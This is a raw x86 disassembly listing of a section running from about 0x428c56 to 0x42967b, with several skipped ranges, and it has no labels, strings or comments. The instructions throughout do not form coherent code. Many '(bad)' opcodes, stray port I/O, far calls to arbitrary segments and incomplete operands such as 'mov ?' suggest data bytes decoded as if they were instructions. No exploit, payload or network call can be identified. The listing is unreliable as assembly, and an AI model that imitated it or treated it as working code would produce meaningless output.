  428c56:	call   0xe474:0x17da632d
  428c5d:	push   edx
  428c5e:	cmp    eax,0x499ca71b
  428c63:	in     al,0x5f
  428c65:	test   BYTE PTR [esi+ecx*4-0x35ca1525],0x13
  428c6d:	pop    esp
  428c6e:	cdq    
  428c6f:	cmp    BYTE PTR [edi-0x35923828],0x28
  428c76:	cmp    BYTE PTR [esi],dh
  428c78:	sub    ah,al
  428c7a:	adc    ecx,DWORD PTR [ebp+0xe]
  428c7d:	jo     0x428c47
  428c7f:	mov    bh,0xf4
  428c81:	into   
  428c82:	cmc    
  428c83:	leave  
  428c84:	cdq    
  428c85:	outs   dx,BYTE PTR ds:[esi]
  428c86:	or     al,0xdc
  428c88:	stos   BYTE PTR es:[edi],al
  428c89:	test   DWORD PTR [ecx-0x4fc797cd],esi
  428c8f:	inc    edx
  428c90:	adc    al,0x61
  428c92:	push   esp
  428c93:	or     edx,DWORD PTR [ebp+esi*2+0x5b090ce]
  428c9a:	lods   eax,DWORD PTR ds:[esi]
  428c9b:	iret   
  428c9c:	xor    dl,BYTE PTR [edi]
  428c9e:	test   BYTE PTR [eax],cl
  428ca0:	leave  
  428ca1:	out    0x3,eax
  428ca3:	push   ecx
  428ca4:	inc    sp
  428ca6:	out    dx,al
  428ca7:	push   eax
  428ca8:	arpl   WORD PTR [ecx],si
  428caa:	jb     0x428c80
  428cac:	aaa    
  428cad:	mov    bl,ah
  428caf:	xchg   edi,eax
  428cb0:	adc    ebx,DWORD PTR gs:[edx-0x3b]
  428cb4:	sub    DWORD PTR [edx],0xb
  428cb7:	inc    ecx
  428cb8:	int    0x20
  428cba:	cmp    edx,DWORD PTR [esi]
  428cbc:	and    al,0xb4
  428cbe:	stos   DWORD PTR es:[edi],eax
  428cbf:	pushf  
  428cc0:	in     al,dx
  428cc1:	cmp    ebx,esp
  428cc3:	mov    al,ds:0x1f566197
  428cc8:	jae    0x428ceb
  428cca:	repnz ds inc ebx
  428ccd:	mov    ch,0xf1
  428ccf:	xor    al,0x50
  428cd1:	or     DWORD PTR [esi+0x5bf20b42],esp
  428cd7:	jae    0x428cea
  428cd9:	sbb    ebx,DWORD PTR [ecx]
  428cdb:	cli    
  428cdc:	pop    ecx
  428cdd:	in     al,0x44
  428cdf:	dec    ecx
  428ce0:	sub    BYTE PTR [ebx-0x41260652],dh
  428ce6:	ror    BYTE PTR [edi],cl
  428ce8:	push   esi
  428ce9:	mov    esp,0xb7b3c372
  428cee:	sar    DWORD PTR [eax+0x79],cl
  428cf1:	cmp    al,0x77
  428cf3:	out    dx,eax
  428cf4:	mov    edi,0x7e76b069
  428cf9:	leave  
  428cfa:	test   BYTE PTR [eax],cl
  428cfc:	cld    
  428cfd:	les    esi,FWORD PTR [ebp+0x6ce29148]
  428d03:	(bad)  
  428d04:	dec    ebp
  428d05:	add    al,0xf9
  428d07:	ja     0x428d3f
  428d09:	push   eax
  428d0a:	push   esp
  428d0b:	stos   DWORD PTR es:[edi],eax
  428d0c:	jl     0x428cf7
  428d0e:	mov    ch,0xa2
	...
  428d74:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0x5ca0
  428d82:	xor    ecx,DWORD PTR [edi+0x58]
  428d85:	mov    ah,0x1
  428d87:	add    BYTE PTR [ecx+eax*1],al
  428d8a:	add    BYTE PTR [eax],al
  428d8c:	pop    edi
  428d8d:	mov    eax,ds:0xb28dae48
  428d92:	neg    edi
  428d94:	ja     0x428d6e
  428d96:	out    dx,al
  428d97:	hlt    
  428d98:	fimul  DWORD PTR [ebx]
  428d9a:	popf   
  428d9b:	jmp    0x428d37
  428d9d:	mov    ch,0x0
  428d9f:	mov    edx,DWORD PTR [esi+eax*4-0x63779b4f]
  428da6:	jmp    0x79757121
  428dab:	xor    edx,ebx
  428dad:	bound  edx,QWORD PTR [ecx+0x2327e750]
  428db3:	sbb    DWORD PTR [ebx],ebx
  428db5:	(bad)  [bp-0x53]
  428db9:	(bad)  
  428dba:	add    BYTE PTR [ecx],dl
  428dbc:	(bad)  
  428dbd:	lock xor BYTE PTR [edi-0x42],ah
  428dc1:	aas    
  428dc2:	jecxz  0x428dd0
  428dc4:	call   0x5f74b305
  428dc9:	fnsave [esi+0x60]
  428dcc:	pop    es
  428dcd:	dec    ecx
  428dce:	out    0x41,eax
  428dd0:	and    ebx,DWORD PTR [ecx+ebp*8+0x64]
  428dd4:	jle    0x428df2
  428dd6:	pop    esp
  428dd7:	popf   
  428dd8:	mov    ds:0xf4e124d6,al
  428ddd:	jns    0x428e30
  428ddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428de0:	ins    DWORD PTR es:[edi],dx
  428de1:	xchg   edx,eax
  428de2:	aad    0xf9
  428de4:	or     ebx,DWORD PTR [edx+ebp*4]
  428de7:	xor    eax,0x2067480f
  428dec:	jns    0x428de4
  428dee:	ss clc 
  428df0:	mov    bl,0x6f
  428df2:	scas   eax,DWORD PTR es:[edi]
  428df3:	popa   
  428df4:	sbb    al,0x84
  428df6:	push   ecx
  428df7:	in     al,dx
  428df8:	(bad)  
  428df9:	pop    edi
  428dfa:	popa   
  428dfb:	jl     0x428d8e
  428dfd:	and    ch,BYTE PTR [ebp+ecx*8-0x30]
  428e01:	xchg   ebp,eax
  428e02:	in     eax,dx
  428e03:	push   ecx
  428e04:	retf   0x996
  428e07:	fcomp  DWORD PTR ds:0x7bc94696
  428e0d:	idiv   BYTE PTR [ecx]
  428e0f:	sbb    eax,0x437dfab
  428e14:	test   DWORD PTR [ebx+0x61],0x3524978d
  428e1b:	mov    ds:0x7f6a0438,eax
  428e20:	cmp    DWORD PTR [esi+0x368c70a0],0x7d5c09f
  428e2a:	jbe    0x428e46
  428e2c:	in     eax,dx
  428e2d:	pop    eax
  428e2e:	mov    BYTE PTR es:[eax],ah
  428e31:	in     eax,dx
  428e32:	enter  0x504,0xd6
  428e36:	sbb    DWORD PTR [esi],eax
  428e38:	lods   al,BYTE PTR ds:[esi]
  428e39:	and    BYTE PTR [esi+0x63557468],dl
  428e3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e40:	xor    BYTE PTR [esi-0x267e66fe],ah
  428e46:	xor    al,BYTE PTR [ecx+0x61]
  428e49:	in     al,0xae
  428e4b:	jno    0x428e2a
  428e4d:	ins    DWORD PTR es:[edi],dx
  428e4e:	js     0x428ea5
  428e50:	cli    
  428e51:	stc    
  428e52:	pop    eax
  428e53:	xchg   ebx,eax
  428e54:	cmp    cl,BYTE PTR es:[edx-0x3db849a4]
  428e5b:	jne    0x428e03
  428e5d:	sub    BYTE PTR [esp+eiz*8-0x2fdcd5c4],bh
  428e64:	lea    edx,[eax+ebx*1]
  428e67:	retf   0x60b6
  428e6a:	in     eax,dx
  428e6b:	dec    ebx
  428e6c:	idiv   BYTE PTR [eax]
  428e6e:	pop    edi
  428e6f:	fmul   QWORD PTR [esi+0x1e]
  428e72:	aaa    
  428e73:	pop    eax
  428e74:	push   0x89cba3
  428e79:	je     0x428eca
  428e7b:	xor    dl,BYTE PTR [ebp+0x75]
  428e7e:	xchg   esi,eax
  428e7f:	sub    edx,ebp
  428e81:	mov    ah,0xcf
  428e83:	cmp    al,0x84
  428e85:	(bad)  
  428e86:	pop    edi
  428e87:	adc    bl,BYTE PTR [ebx+0x42]
  428e8a:	(bad)  
  428e8b:	cmp    al,0x76
  428e8d:	sbb    eax,0x7233
	...
  428ef2:	add    BYTE PTR [eax],al
  428ef4:	dec    edi
  428ef5:	pop    ebp
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0x2c
  428f01:	lods   al,BYTE PTR ds:[esi]
  428f02:	push   ebx
  428f03:	call   0x104:0x1b55c
  428f0a:	add    BYTE PTR [eax],al
  428f0c:	add    eax,0x844c8f5c
  428f11:	scas   eax,DWORD PTR es:[edi]
  428f12:	cli    
  428f13:	aad    0xb4
  428f15:	lds    edi,FWORD PTR [eax]
  428f17:	rol    DWORD PTR [edx],cl
  428f19:	js     0x428f39
  428f1b:	in     eax,0xd5
  428f1d:	lahf   
  428f1e:	mov    ecx,DWORD PTR [ecx-0x70]
  428f21:	jb     0x428eef
  428f23:	inc    ecx
  428f24:	rcr    ah,1
  428f26:	ret    
  428f27:	pop    eax
  428f28:	mov    bh,0x5
  428f2a:	sbb    eax,0x77a1f8b0
  428f2f:	ret    0xcf9d
  428f32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428f33:	xor    dh,BYTE PTR [esi]
  428f35:	sub    edi,edx
  428f37:	neg    BYTE PTR [edi-0x31]
  428f3a:	mov    bl,0x9c
  428f3c:	adc    al,0x16
  428f3e:	sub    al,0x70
  428f40:	sar    BYTE PTR [ecx],1
  428f42:	add    al,0x93
  428f44:	clc    
  428f45:	cld    
  428f46:	jo     0x428ee9
  428f48:	mov    eax,0x48431b06
  428f4d:	adc    eax,0xe1533c65
  428f52:	(bad)
  428f55:	(bad)  [edx+0x44]
  428f58:	imul   eax,DWORD PTR [eax-0x73],0x6f
  428f5c:	shr    BYTE PTR [edx-0x9],1
  428f5f:	in     eax,0x9b
  428f61:	loopne 0x428eef
  428f63:	mov    BYTE PTR [ecx+edi*2-0x5c234ebb],ah
  428f6a:	dec    edi
  428f6b:	dec    bp
  428f6d:	lds    edi,FWORD PTR [ecx-0x32]
  428f70:	aaa    
  428f71:	sub    dh,BYTE PTR [ebx-0x25e00e2c]
  428f77:	shr    DWORD PTR [eax],cl
  428f79:	movsx  edx,BYTE PTR [eax]
  428f7c:	push   eax
  428f7d:	add    dl,BYTE PTR [esi-0x3fa40608]
  428f83:	mov    ch,0xaf
  428f85:	(bad)  
  428f87:	out    0x8b,eax
  428f89:	xlat   BYTE PTR ds:[ebx]
  428f8a:	sti    
  428f8b:	xchg   esp,eax
  428f8c:	gs call 0xcd86:0xf755ce02
  428f94:	push   0x70
  428f96:	adc    edx,eax
  428f98:	rcr    BYTE PTR [ebx],1
  428f9a:	inc    esp
  428f9b:	jns    0x428fdd
  428f9d:	jno    0x428f22
  428f9f:	dec    edx
  428fa0:	aaa    
  428fa1:	dec    esp
  428fa2:	leave  
  428fa3:	and    DWORD PTR [ebx+0x78],edx
  428fa6:	and    bh,BYTE PTR [eax-0x5a]
  428fa9:	lahf   
  428faa:	ror    ah,1
  428fac:	sbb    eax,0x1465a54f
  428fb1:	pop    ds
  428fb2:	dec    ebp
  428fb3:	or     ecx,esi
  428fb5:	add    DWORD PTR [ebx],esp
  428fb7:	stos   DWORD PTR es:[edi],eax
  428fb8:	pop    ebp
  428fb9:	fild   QWORD PTR [eax+edi*1-0x330df825]
  428fc0:	jp     0x428f9f
  428fc2:	int3   
  428fc3:	test   DWORD PTR [ebp-0x6],esp
  428fc6:	xor    ecx,DWORD PTR [esi+0x7b]
  428fc9:	leave  
  428fca:	inc    ebp
  428fcb:	inc    ebx
  428fcc:	add    DWORD PTR [ecx+esi*8],ecx
  428fcf:	cmp    dl,BYTE PTR [eax]
  428fd1:	lea    edx,[ebp+0x14d365f6]
  428fd7:	stc    
  428fd8:	xchg   DWORD PTR [eax-0x78],edi
  428fdb:	dec    ebx
  428fdc:	(bad)  
  428fdd:	jl     0x42902d
  428fdf:	xchg   ebx,eax
  428fe0:	int3   
  428fe1:	and    BYTE PTR [eax-0x1e684927],ch
  428fe7:	nop
  428fe8:	push   esi
  428fe9:	dec    ebx
  428fea:	(bad)  
  428feb:	mov    al,ds:0x328f5c1a
  428ff0:	jmp    0xbe08404
  428ff5:	call   0x17c11998
  428ffa:	mov    dl,ch
  428ffc:	jmp    0xf1e3:0x9766c69b
  429003:	lock mov es,WORD PTR [ecx+0x166bc1a1]
  42900a:	mov    bl,0xbe
  42900c:	jl     0x429072
  42900e:	cs push 0x0
	...
  429071:	add    BYTE PTR [eax],al
  429073:	add    cl,ah
  429075:	in     al,dx
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0x95fc7b77
  429081:	jmp    0xb6a37fed
  429086:	add    DWORD PTR [eax],eax
  429088:	add    al,0x1
  42908a:	add    BYTE PTR [eax],al
  42908c:	sbb    ah,BYTE PTR [edi+esi*8]
  42908f:	std    
  429090:	mov    eax,0xcb6afa3d
  429095:	lock sahf 
  429097:	lock mov WORD PTR [ebp+0x6c91cfd7],?
  42909e:	not    DWORD PTR [eax+0x59]
  4290a1:	test   DWORD PTR [edi],ebp
  4290a3:	push   esp
  4290a4:	xchg   esi,eax
  4290a5:	cmp    eax,DWORD PTR [ebp+0x27b9a]
  4290ab:	and    edx,DWORD PTR [edi]
  4290ad:	lea    esp,[ebx+0x77]
  4290b0:	mov    WORD PTR [esi-0x52b6598],fs
  4290b6:	jmp    0x429079
  4290b8:	push   ds
  4290b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290ba:	jg     0x4290af
  4290bc:	adc    al,0xfd
  4290be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4290c0:	stos   DWORD PTR es:[edi],eax
  4290c1:	cmp    eax,0x3899790b
  4290c6:	js     0x42911f
  4290c8:	xchg   esp,eax
  4290c9:	mov    al,0xc0
  4290cb:	adc    esp,esi
  4290cd:	mov    eax,0x8391218f
  4290d2:	je     0x42911e
  4290d4:	je     0x4290e2
  4290d6:	ror    BYTE PTR [edi+0x5b69919a],1
  4290dc:	cmp    dl,BYTE PTR [ecx-0x28]
  4290df:	mov    ch,0xc4
  4290e1:	dec    ecx
  4290e2:	pop    es
  4290e3:	inc    ecx
  4290e4:	shl    BYTE PTR [ecx],1
  4290e6:	loope  0x4290d7
  4290e8:	pop    edx
  4290e9:	push   ds
  4290ea:	ins    DWORD PTR es:[edi],dx
  4290eb:	test   eax,0x1e507409
  4290f0:	sbb    ebp,ecx
  4290f2:	sub    al,0x29
  4290f4:	ss pushf 
  4290f6:	lock ss jecxz 0x4290b1
  4290fa:	adc    eax,0xcf7bdd98
  4290ff:	iret   
  429100:	push   0x66
  429102:	popf   
  429103:	jecxz  0x4290e2
  429105:	fdiv   st(0),st
  429107:	pop    eax
  429108:	push   ss
  429109:	ret    
  42910a:	xor    BYTE PTR [edx-0x728d6ba8],bl
  429110:	xor    ebp,DWORD PTR [ebp+0x8]
  429113:	aad    0xbc
  429115:	mov    ebx,0x87ce155a
  42911a:	inc    eax
  42911b:	xor    al,0xc1
  42911d:	pop    es
  42911e:	cmp    eax,0x60b52ee8
  429123:	or     ebx,edx
  429125:	xchg   edi,eax
  429126:	shl    DWORD PTR [bp+si],0xa6
  42912a:	xchg   ebp,eax
  42912b:	jo     0x429151
  42912d:	xchg   esp,eax
  42912e:	or     BYTE PTR [esi+0x6f],0x71
  429132:	mov    bl,0x2a
  429134:	into   
  429135:	gs call 0x64cb46fa
  42913b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42913c:	or     BYTE PTR [esi],ch
  42913e:	xchg   ecx,eax
  42913f:	push   0x3f
  429141:	pop    ebx
  429142:	push   ebp
  429143:	stos   DWORD PTR es:[edi],eax
  429144:	jo     0x42919a
  429146:	jb     0x4290ec
  429148:	imul   DWORD PTR [ebx]
  42914a:	fadd   DWORD PTR cs:[eax-0x6f]
  42914e:	mov    ds:0xec49f6ae,eax
  429153:	dec    esi
  429154:	test   BYTE PTR [ecx+0x123ce433],bh
  42915a:	cld    
  42915b:	pop    es
  42915c:	mov    bl,0x25
  42915e:	and    bh,dl
  429160:	add    al,0x3
  429162:	xor    esp,DWORD PTR [esi+0x20400005]
  429168:	jl     0x42916f
  42916a:	jo     0x429189
  42916c:	ss mov dh,0x96
  42916f:	ins    DWORD PTR es:[edi],dx
  429170:	lahf   
  429171:	pushf  
  429172:	mov    esp,0x76c409ce
  429177:	mov    BYTE PTR [ecx-0x63],al
  42917a:	mov    al,ds:0xd6b135c9
  42917f:	or     BYTE PTR [ebp-0x2e1a7fc3],cl
  429185:	dec    esi
  429186:	and    al,0x9f
  429188:	add    al,0xb7
  42918a:	adc    DWORD PTR [edx-0x78],esp
  42918d:	fwait
  42918e:	sub    al,dl
	...
  4291f4:	push   esi
  4291f5:	xchg   ebp,edi
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [edi+edx*1+0x645da5ac],0x40001b7
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [ebp-0x1e4886f8],dh
  429211:	ss enter 0x8c3b,0x8d
  429216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429217:	call   0xfb37:0x86b1918d
  42921e:	xor    eax,0x43e353e1
  429223:	jnp    0x4291e5
  429225:	sub    al,0x84
  429227:	mov    ebp,0xdb6e1381
  42922c:	das    
  42922d:	cs dec ecx
  42922f:	xor    ebx,esp
  429231:	mov    ecx,0x223cae2d
  429236:	jno    0x42927f
  429238:	cmp    eax,0x23a45e34
  42923d:	mov    esp,0xc0fcf008
  429242:	pusha  
  429243:	shl    DWORD PTR [ebx+0x2f],0x19
  429247:	xchg   esp,eax
  429248:	aad    0xc3
  42924a:	sub    DWORD PTR [edx+0x3fad0b78],esi
  429250:	cs in  al,0x66
  429253:	push   ss
  429254:	xchg   ebx,eax
  429255:	add    edi,ebx
  429257:	pop    ds
  429258:	pop    esi
  429259:	push   es
  42925a:	repnz inc esi
  42925c:	pop    esp
  42925d:	add    dl,dl
  42925f:	or     ah,BYTE PTR [edi+esi*1]
  429262:	je     0x42925a
  429264:	clc    
  429265:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429266:	xchg   BYTE PTR [eax],bl
  429268:	ret    0x546a
  42926b:	fmul   DWORD PTR [edi-0xd]
  42926e:	gs clc 
  429270:	inc    edi
  429271:	(bad)  
  429272:	std    
  429273:	fsubrp st(3),st
  429275:	sbb    eax,0x82dc6318
  42927a:	push   ss
  42927b:	mov    ah,0x61
  42927d:	jae    0x4292b3
  42927f:	in     eax,dx
  429280:	int    0x79
  429282:	ret    
  429283:	test   eax,0xd89b5803
  429288:	hlt    
  429289:	rcr    DWORD PTR [ebp-0x1a],0xae
  42928d:	test   al,0xdf
  42928f:	mov    sp,0x6060
  429293:	cld    
  429294:	mov    ecx,0xa73c2105
  429299:	sahf   
  42929a:	aas    
  42929b:	jne    0x4292b6
  42929d:	popf   
  42929e:	mov    ch,0x89
  4292a0:	sub    bl,bl
  4292a2:	stos   BYTE PTR es:[edi],al
  4292a3:	(bad)  
  4292a4:	icebp  
  4292a5:	lock sbb eax,0xfe3d569c
  4292ab:	jmp    0x43b26dac
  4292b0:	std    
  4292b1:	fdivr  DWORD PTR [esi]
  4292b3:	cld    
  4292b4:	inc    ecx
  4292b5:	pushf  
  4292b6:	scas   eax,DWORD PTR es:[edi]
  4292b7:	xchg   edi,eax
  4292b8:	cmp    BYTE PTR [ebx],cl
  4292ba:	and    al,0xa3
  4292bc:	in     eax,0xf6
  4292be:	push   eax
  4292bf:	dec    eax
  4292c0:	jns    0x4292f2
  4292c2:	dec    esi
  4292c3:	xchg   edx,eax
  4292c4:	pushf  
  4292c5:	scas   eax,DWORD PTR es:[edi]
  4292c6:	in     eax,0x7f
  4292c8:	push   ds
  4292c9:	mov    dl,BYTE PTR ds:0xdaec5c92
  4292cf:	(bad)  
  4292d0:	in     eax,0x57
  4292d2:	js     0x4292a6
  4292d4:	fucomip st,st(2)
  4292d6:	es (bad) 
  4292d8:	pop    ecx
  4292d9:	sub    esi,edx
  4292db:	pop    eax
  4292dc:	ins    DWORD PTR es:[edi],dx
  4292dd:	add    ecx,DWORD PTR [ebp+ecx*4+0x71eb68dd]
  4292e4:	mov    ebx,0x9adf7fed
  4292e9:	cmc    
  4292ea:	cmp    ch,BYTE PTR [edx+edi*8]
  4292ed:	sub    DWORD PTR [ecx-0x7e],edx
  4292f0:	fld    TBYTE PTR [ecx]
  4292f2:	xchg   esp,eax
  4292f3:	jae    0x4292d3
  4292f5:	mov    eax,ds:0xcb34e8f3
  4292fa:	push   0x76
  4292fc:	xlat   BYTE PTR ds:[ebx]
  4292fd:	jecxz  0x429346
  4292ff:	test   DWORD PTR [edx],0x599e3a5e
  429305:	adc    DWORD PTR [edi],0x73
  429308:	sub    al,0x94
  42930a:	mov    cl,0x3d
  42930c:	test   DWORD PTR [edx],esp
  42930e:	cld    
  42930f:	mov    ds:0x0,eax
	...
  429374:	lock adc al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0xaa
  429381:	sbb    edx,DWORD PTR [edi+0x1b86869]
  429387:	add    BYTE PTR [ecx+eax*1],al
  42938a:	add    BYTE PTR [eax],al
  42938c:	cdq    
  42938d:	dec    esp
  42938e:	outs   dx,BYTE PTR ds:[esi]
  42938f:	test   eax,0x20716451
  429394:	mov    ds:0xeae705b9,al
  429399:	mov    dh,0x27
  42939b:	inc    edx
  42939c:	iret   
  42939d:	mov    bl,0x74
  42939f:	adc    BYTE PTR [ecx],0xc6
  4293a2:	(bad)  [edx+0x3]
  4293a5:	push   cs
  4293a6:	ud2    
  4293a8:	es push ebp
  4293aa:	jbe    0x429364
  4293ac:	test   al,0x6f
  4293ae:	jg     0x4293f8
  4293b0:	adc    bh,BYTE PTR [esi]
  4293b2:	adc    edx,DWORD PTR [edi+0x6f]
  4293b5:	dec    ecx
  4293b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4293b7:	jg     0x4293c1
  4293b9:	xor    cl,bl
  4293bb:	lea    ebx,[ebx+0x18]
  4293be:	aaa    
  4293bf:	push   eax
  4293c0:	sub    BYTE PTR [esi-0x5f4c352f],ah
  4293c6:	fdiv   st(3),st
  4293c8:	lods   eax,DWORD PTR ds:[esi]
  4293c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4293ca:	inc    ebx
  4293cb:	(bad)  
  4293cd:	icebp  
  4293ce:	add    BYTE PTR [ebp+0x72],ch
  4293d1:	mov    ebx,0x9aea73bd
  4293d6:	pop    ebx
  4293d7:	add    esp,DWORD PTR [esi+0x38]
  4293da:	in     al,dx
  4293db:	ret    0xe34a
  4293de:	in     al,dx
  4293df:	mov    ecx,0xe1d4b75c
  4293e4:	gs stc 
  4293e6:	mov    al,0xc7
  4293e8:	cli    
  4293e9:	icebp  
  4293ea:	shl    BYTE PTR [ebp+0x2432cfd4],cl
  4293f0:	xor    BYTE PTR [ecx+0x50],0x13
  4293f4:	rcl    DWORD PTR [esi-0x63a2a65d],1
  4293fa:	sub    BYTE PTR [ecx],dl
  4293fc:	xlat   BYTE PTR ds:[ebx]
  4293fd:	(bad)  
  4293fe:	ins    DWORD PTR es:[edi],dx
  4293ff:	imul   edi,DWORD PTR [eax],0xffffff92
  429402:	adc    edx,edi
  429404:	adc    bl,BYTE PTR [edx*2+0x6b74b62e]
  42940b:	mov    ?,WORD PTR fs:[edi+edi*1+0x69eb8759]
  429413:	cmp    BYTE PTR [ebp-0x49105e91],0x11
  42941a:	gs mov ebp,0x37347315
  429420:	and    ecx,0xc7a8ef5a
  429426:	inc    esi
  429427:	ss or  al,0x32
  42942a:	sbb    esp,DWORD PTR [ebx-0x7e]
  42942d:	mov    bl,0x69
  42942f:	pop    ebp
  429430:	jbe    0x429427
  429432:	test   eax,0x16ff5eb1
  429437:	sub    DWORD PTR [ecx-0x34b7ec0a],ecx
  42943d:	jnp    0x4294bc
  42943f:	mov    edx,0x244d6029
  429444:	es out dx,al
  429446:	xchg   esp,eax
  429447:	sti    
  429448:	scas   al,BYTE PTR es:[edi]
  429449:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42944b:	out    0xa9,al
  42944d:	pop    ecx
  42944e:	xor    eax,0xa102fe3c
  429453:	out    0x46,al
  429455:	fstp   DWORD PTR [edx+0x79]
  429458:	leave  
  429459:	push   0x5e043f21
  42945e:	jle    0x42946d
  429460:	pop    edx
  429461:	xor    ebp,edi
  429463:	sub    al,BYTE PTR [eax+edx*1-0x3d6155c]
  42946a:	test   edx,esp
  42946c:	pop    edi
  42946d:	rol    DWORD PTR [ebx-0x47],cl
  429470:	fsubr  QWORD PTR [edx]
  429472:	jp     0x429442
  429474:	mov    WORD PTR [esi-0x2b],cs
  429477:	fisubr WORD PTR [ebp+0x8]
  42947a:	xor    eax,ebp
  42947c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42947d:	outs   dx,DWORD PTR ds:[esi]
  42947e:	mov    WORD PTR [ebp-0x6cd34ea0],ds
  429484:	(bad)  
  429486:	outs   dx,BYTE PTR ds:[esi]
  429487:	and    al,0x7d
  429489:	cmp    al,0x1d
  42948b:	jne    0x4294b0
  42948d:	sbb    bl,cl
  42948f:	fiadd  DWORD PTR [eax]
	...
  4294f1:	add    BYTE PTR [eax],al
  4294f3:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  4294f7:	sub    al,0x53
  4294f9:	ds jg  0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp-0x78fd16],dx
  429503:	mov    eax,ds:0x1b96c
  429508:	add    al,0x1
  42950a:	add    BYTE PTR [eax],al
  42950c:	sbb    esi,DWORD PTR [eax+esi*2-0x782bc6b2]
  429513:	popa   
  429514:	out    0x13,eax
  429516:	push   edi
  429517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429518:	mov    cl,0x80
  42951a:	cli    
  42951b:	repz retf 0xa7d1
  42951f:	mov    eax,ds:0xbc172808
  429524:	loope  0x4295a2
  429526:	retf   0x1a0
  429529:	pop    esp
  42952a:	mov    cl,0x4f
  42952c:	jo     0x4294da
  42952e:	push   ecx
  42952f:	xor    esi,ecx
  429531:	add    edi,DWORD PTR [edi]
  429533:	or     dh,BYTE PTR ds:0xb29f23cf
  429539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42953a:	aam    0xa6
  42953c:	inc    esi
  42953d:	push   ebp
  42953e:	jae    0x4294c2
  429540:	xor    BYTE PTR [ebx-0x665afd9d],bh
  429546:	scas   al,BYTE PTR es:[edi]
  429547:	mov    al,ds:0x1c0fbd34
  42954c:	cld    
  42954d:	std    
  42954e:	jne    0x429572
  429550:	outs   dx,DWORD PTR ds:[esi]
  429551:	mov    ch,0xc5
  429553:	sub    al,0xd0
  429555:	sahf   
  429556:	test   DWORD PTR [esi],edx
  429558:	or     al,0x55
  42955a:	jmp    0x42956b
  42955c:	pop    eax
  42955d:	lds    esi,FWORD PTR [ebx-0x7f4b50d7]
  429563:	xor    BYTE PTR ds:0x6e0787ed,bh
  429569:	iret   
  42956a:	mov    ah,0xbc
  42956c:	test   al,0x12
  42956e:	leave  
  42956f:	adc    esi,eax
  429571:	out    dx,eax
  429572:	cmc    
  429573:	lea    ecx,[ebx+0x1]
  429576:	push   0x23
  429578:	loop   0x429530
  42957a:	fild   WORD PTR [ebx]
  42957c:	mov    edi,0x9d62f69a
  429581:	test   al,0xcc
  429583:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429584:	dec    edx
  429585:	fdiv   DWORD PTR [edi-0x46]
  429588:	shl    DWORD PTR [ebx],0xbb
  42958b:	mov    al,ds:0x1105d35a
  429590:	rol    bh,1
  429592:	sub    eax,DWORD PTR [ecx-0x4af14312]
  429598:	push   cs
  429599:	ret    0xc4ec
  42959c:	xor    DWORD PTR [edi+ecx*2+0x64],0xeb410ffd
  4295a4:	xor    BYTE PTR [ebp-0x77],al
  4295a7:	cmp    esi,esp
  4295a9:	or     bh,BYTE PTR [ebp+0x6fdea02f]
  4295af:	test   eax,0xbd1622eb
  4295b4:	je     0x429630
  4295b6:	mov    edx,esi
  4295b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4295b9:	xchg   edx,eax
  4295ba:	jecxz  0x4295a8
  4295bc:	jp     0x42963c
  4295be:	cmp    BYTE PTR [ecx],0xe1
  4295c1:	fidiv  WORD PTR [ecx-0x2092c0b8]
  4295c7:	aas    
  4295c8:	mov    eax,0x74847d60
  4295cd:	mov    bl,0x5c
  4295cf:	jg     0x42957f
  4295d1:	pop    ss
  4295d2:	iret   
  4295d3:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4295d5:	(bad)  
  4295d6:	in     al,dx
  4295d7:	sub    eax,0x85b23b6b
  4295dc:	dec    edi
  4295dd:	mov    ch,0xa7
  4295df:	ja     0x429652
  4295e1:	(bad)  
  4295e2:	popf   
  4295e3:	mov    es,eax
  4295e5:	outs   dx,DWORD PTR ds:[esi]
  4295e6:	sbb    ah,BYTE PTR [edi-0xa]
  4295e9:	pop    esp
  4295ea:	and    al,0x53
  4295ec:	repz pushf 
  4295ee:	bound  edi,QWORD PTR [edx-0x46]
  4295f1:	mov    BYTE PTR [ebx-0x2e1599b1],dl
  4295f7:	jmp    0x4295e2
  4295f9:	mov    DWORD PTR gs:[ebx-0x5dbad140],esp
  429600:	pop    ds
  429601:	lods   eax,DWORD PTR ds:[esi]
  429602:	fstp   DWORD PTR [esp+esi*4-0x5d]
  429606:	mov    cl,0x4b
  429608:	test   BYTE PTR [esi+0x44],al
  42960b:	mov    al,ds:0x580e0f3d
	...
  429674:	ins    DWORD PTR es:[edi],dx
  429675:	sbb    eax,0xfbf6c0e6
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
